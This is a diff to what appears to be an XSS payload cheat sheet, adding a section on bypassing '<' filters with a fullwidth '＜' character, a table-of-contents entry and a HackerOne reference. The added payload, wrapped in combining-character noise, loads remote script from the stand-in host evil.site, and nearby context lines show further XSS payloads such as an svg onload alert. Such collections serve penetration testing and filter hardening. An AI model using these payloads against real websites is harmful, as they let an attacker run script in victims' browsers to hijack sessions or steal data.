@@ -39,6 +39,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
   - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
   - [Bypass ">" using nothing](#bypass----using-nothing)
+  - [Bypass "<" using ＜](#bypass----using-＜)
   - [Bypass ";" using another character](#bypass-using------using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
@@ -776,6 +777,12 @@ You don't need to close your tags.
 <svg onload=alert(1)//
 ```
 
+### Bypass "<" using ＜ 
+
+```javascript
+[̕h+͓.＜script/src=//evil.site/poc.js>.͓̮̮ͅ=sW&͉̹̻͙̫̦̮̲͏̼̝̫́̕
+```
+
 ### Bypass ";" using another character
 
 ```javascript
@@ -1135,3 +1142,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
+- [Bypass < with ＜](https://hackerone.com/reports/639684)
